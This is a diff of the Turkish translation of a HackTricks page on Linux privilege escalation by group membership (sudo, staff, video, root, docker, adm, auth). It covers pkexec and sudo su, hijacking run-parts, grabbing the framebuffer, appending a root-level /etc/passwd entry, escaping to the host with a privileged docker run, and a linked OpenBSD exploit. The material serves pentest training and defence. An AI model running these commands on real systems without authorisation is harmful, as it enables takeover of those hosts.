@@ -1,24 +1,25 @@
 # İlginç Gruplar - Linux İzin Yükseltme
 
+{% hint style="success" %}
+AWS Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitimi AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitimi GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Sıfırdan kahraman olana kadar AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>
+<summary>HackTricks'i Destekleyin</summary>
 
-HackTricks'ı desteklemenin diğer yolları:
-
-* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
-* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**'da takip edin.**
-* **Hacking püf noktalarınızı paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
+* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
+* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
+* **Hacking püf noktalarını paylaşarak PR göndererek HackTricks** ve **HackTricks Cloud** github depolarına katkıda bulunun.
 
 </details>
+{% endhint %}
 
 ## Sudo/Yönetici Grupları
 
 ### **PE - Yöntem 1**
 
-**Bazen**, **varsayılan olarak (veya bazı yazılımların ihtiyaç duyması nedeniyle)** **/etc/sudoers** dosyasının içinde bu satırlardan bazılarını bulabilirsiniz:
+**Bazen**, **varsayılan olarak (veya bazı yazılımların ihtiyaç duyması nedeniyle)** **/etc/sudoers** dosyasının içinde bu tür satırları bulabilirsiniz:
 ```bash
 # Allow members of group sudo to execute any command
 %sudo	ALL=(ALL:ALL) ALL
@@ -28,7 +29,7 @@ HackTricks'ı desteklemenin diğer yolları:
 ```
 Bu, **sudo veya admin grubuna ait herhangi bir kullanıcının sudo olarak herhangi bir şeyi çalıştırabileceği anlamına gelir**.
 
-Bu durumda, **root olmak için sadece şunu çalıştırabilirsiniz**:
+Eğer durum buysa, **root olmak için sadece şunu çalıştırabilirsiniz**:
 ```
 sudo su
 ```
@@ -39,11 +40,11 @@ Tüm suid ikili dosyaları bulun ve **Pkexec** ikilisinin olup olmadığını ko
 find / -perm -4000 2>/dev/null
 ```
 Eğer **pkexec** ikili dosyasının bir SUID ikili dosyası olduğunu ve **sudo** veya **admin** grubuna ait olduğunuzu tespit ederseniz, muhtemelen `pkexec` kullanarak ikili dosyaları sudo olarak çalıştırabilirsiniz.\
-Bu genellikle **polkit politikası** içindeki gruplardır. Bu politika genellikle hangi grupların `pkexec`'i kullanabileceğini belirler. Şununla kontrol edin:
+Bu genellikle **polkit politikası** içindeki gruplardır. Bu politika genellikle hangi grupların `pkexec`'i kullanabileceğini belirler. Bunu kontrol etmek için:
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
 ```
-Aşağıda, hangi grupların **pkexec**'i çalıştırmasına izin verildiğini ve bazı Linux dağıtımlarında varsayılan olarak **sudo** ve **admin** gruplarının göründüğünü bulacaksınız.
+Aşağıda, hangi grupların **pkexec**'i **ve varsayılan olarak** bazı linux dağıtımlarında **sudo** ve **admin** gruplarının göründüğünü bulacaksınız.
 
 **Root olmak için şunu çalıştırabilirsiniz**:
 ```bash
@@ -92,9 +93,9 @@ sudo su
 ```
 ## Personel Grubu
 
-**staff**: Kullanıcılara kök ayrıcalıklarına ihtiyaç duymadan sistemdeki (`/usr/local`) yerel değişiklikler eklemelerine izin verir (`/usr/local/bin` dizinindeki yürütülebilir dosyalar, aynı isme sahip `/bin` ve `/usr/bin` dizinlerindeki yürütülebilir dosyaları "geçersiz kılabilir"). İzleme/güvenlik ile daha fazla ilgili olan "adm" grubu ile karşılaştırın. [\[kaynak\]](https://wiki.debian.org/SystemGroups)
+**staff**: Kullanıcılara kök ayrıcalıklarına ihtiyaç duymadan sistemde yerel değişiklikler yapma izni verir (`/usr/local`) (not olarak `/usr/local/bin` dizinindeki yürütülebilir dosyalar, aynı isme sahip `/bin` ve `/usr/bin` dizinlerindeki yürütülebilir dosyaları "geçersiz kılabilir"). İzleme/güvenlik ile daha fazla ilgili olan "adm" grubu ile karşılaştırın. [\[kaynak\]](https://wiki.debian.org/SystemGroups)
 
-Debian dağıtımlarında, `$PATH` değişkeni, ayrıcalıklı kullanıcı olup olmadığınıza bakılmaksızın `/usr/local/`'in en yüksek öncelikle çalıştırılacağını gösterir.
+Debian dağıtımlarında, `$PATH` değişkeni `/usr/local/`'in, ayrıcalıklı kullanıcı olup olmadığınıza bakılmaksızın en yüksek önceliğe sahip olacağını gösterir.
 ```bash
 $ echo $PATH
 /usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
@@ -102,7 +103,7 @@ $ echo $PATH
 # echo $PATH
 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 ```
-Eğer `/usr/local` dizinindeki bazı programları ele geçirebilirsek, kök erişim elde etmek kolay olacaktır.
+Eğer `/usr/local` içindeki bazı programları ele geçirebilirsek, kök erişim elde etmek kolay olacaktır.
 
 `run-parts` programını ele geçirmek, kök erişim elde etmenin kolay bir yoludur, çünkü birçok program `run-parts` benzeri bir programı çalıştıracaktır (crontab, ssh girişi yapıldığında).
 ```bash
@@ -174,14 +175,22 @@ moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
 ```
 **tty1**, kullanıcının makinedeki bir terminalde **fiziksel olarak oturum açtığı** anlamına gelir.
 
-**video grubu**, ekran çıktısını görüntüleme iznine sahiptir. Temelde ekranları gözlemleyebilirsiniz. Bunun için ekranın mevcut görüntüsünü ham veri olarak **almanız** ve ekranın kullandığı çözünürlüğü elde etmeniz gerekir. Ekran verisi `/dev/fb0`'da kaydedilebilir ve bu ekranın çözünürlüğünü `/sys/class/graphics/fb0/virtual_size` üzerinde bulabilirsiniz.
+**video grubu**, ekran çıktısını görüntüleme erişimine sahiptir. Temelde ekranları gözlemleyebilirsiniz. Bunun için ekranın mevcut görüntüsünü ham veri olarak **almanız** ve ekranın kullandığı çözünürlüğü almanız gerekir. Ekran verisi `/dev/fb0`'da kaydedilebilir ve bu ekranın çözünürlüğünü `/sys/class/graphics/fb0/virtual_size` üzerinde bulabilirsiniz.
 ```bash
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
 ```
-**Kök Grubu**
+**Raw görüntüyü** açmak için **GIMP** kullanabilirsiniz, \*\*`screen.raw` \*\* dosyasını seçin ve dosya türünü **Ham görüntü verisi** olarak seçin:
 
-Varsayılan olarak, kök grubu üyelerinin bazı hizmet yapılandırma dosyalarını veya bazı kütüphane dosyalarını değiştirme erişimine sahip olabileceği veya ayrıcalıkları yükseltmek için kullanılabilecek **diğer ilginç şeyler** olabileceği görünüyor...
+![](<../../../.gitbook/assets/image (463).png>)
+
+Ardından Genişlik ve Yüksekliği ekranda kullanılanlara değiştirin ve farklı Görüntü Türlerini kontrol edin (ve ekranda daha iyi gösterenini seçin):
+
+![](<../../../.gitbook/assets/image (317).png>)
+
+## Kök Grup
+
+Varsayılan olarak **kök grubun üyelerinin**, **hizmet** yapılandırma dosyalarını veya bazı **kütüphane** dosyalarını değiştirme erişimine sahip olabileceği veya ayrıcalıkları yükseltmek için kullanılabilecek **diğer ilginç şeyler** olabileceği görünüyor...
 
 **Kök üyelerin hangi dosyaları değiştirebileceğini kontrol edin**:
 ```bash
@@ -201,18 +210,6 @@ echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/pa
 #Ifyou just want filesystem and network access you can startthe following container:
 docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
 ```
-Son olarak, önceki önerilerden hiçbirini beğenmediyseniz veya bir nedenle çalışmıyorsa (docker api firewall?) her zaman şu işlemi deneyebilirsiniz: **ayrıcalıklı bir konteyner çalıştırın ve ondan kaçın** burada açıklandığı gibi:
-
-{% content-ref url="../docker-security/" %}
-[docker-security](../docker-security/)
-{% endcontent-ref %}
-
-Docker soketi üzerinde yazma izinleriniz varsa [**docker soketini kötüye kullanarak ayrıcalıkları yükseltme hakkında bu yazıyı okuyun**](../#writable-docker-socket)**.**
-
-{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}
-
-{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}
-
 ## lxc/lxd Grubu
 
 {% content-ref url="./" %}
@@ -221,24 +218,10 @@ Docker soketi üzerinde yazma izinleriniz varsa [**docker soketini kötüye kull
 
 ## Adm Grubu
 
-Genellikle **`adm`** grubunun **üyeleri** _/var/log/_ dizinindeki **logları okuma** iznine sahiptir.\
+Genellikle **`adm`** grubunun **üyeleri** _/var/log/_ dizininde bulunan **logları okuma** iznine sahiptir.\
 Bu nedenle, bu gruptaki bir kullanıcıyı ele geçirdiyseniz kesinlikle **loglara bakmalısınız**.
 
 ## Auth Grubu
 
 OpenBSD içinde **auth** grubu genellikle _**/etc/skey**_ ve _**/var/db/yubikey**_ dizinlerine yazma iznine sahiptir.\
-Bu izinler, aşağıdaki açığı kötüye kullanarak kök ayrıcalıklarına **yükseltilebilir**: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
-
-<details>
-
-<summary><strong>Sıfırdan başlayarak AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
-
-HackTricks'ı desteklemenin diğer yolları:
-
-* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
-* [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
-* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
-* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
-* **Hacking püf noktalarınızı paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
-
-</details>
+Bu izinler, aşağıdaki açığı kullanarak kök ayrıcalıklarına **yükseltmek** için istismar edilebilir: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
